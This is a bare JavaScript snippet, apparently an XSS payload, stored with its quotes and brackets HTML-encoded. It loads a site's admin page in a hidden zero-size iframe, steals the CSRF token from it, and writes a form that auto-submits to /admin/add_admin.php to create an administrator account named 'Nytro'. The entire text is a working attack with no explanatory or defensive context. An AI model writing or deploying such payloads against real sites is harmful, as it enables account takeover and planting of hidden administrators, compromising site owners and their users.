document.writeln(&#39;&lt;iframe id=&#34;iframe&#34; src=&#34;/admin/admin.php?action=add_admin&#34; width=&#34;0&#34; height=&#34;0&#34; onload=&#34;read()&#34;&gt;&lt;/iframe&gt;&#39;);

function read() {

    var name = &#39;Nytro&#39;;
    var token = document.getElementById(&#34;iframe&#34;).contentDocument.forms[0].token.value;
    
    document.writeln(&#39;&lt;form width=&#34;0&#34; height=&#34;0&#34; method=&#34;post&#34; action=&#34;/admin/add_admin.php&#34;&gt;&#39;);
    document.writeln(&#39;&lt;input type=&#34;text&#34; name=&#34;name&#34; value=&#34;&#39; + name + &#39;&#34; /&gt;&lt;br /&gt;&#39;);
    document.writeln(&#39;&lt;input type=&#34;hidden&#34; name=&#34;token&#34; value=&#34;&#39; + token + &#39;&#34; /&gt;&#39;);
    document.writeln(&#39;&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Add_admin&#34; /&gt;&lt;br /&gt;&#39;);
    document.writeln(&#39;&lt;/form&gt;&#39;);
    document.forms[0].submit.click();
    
}

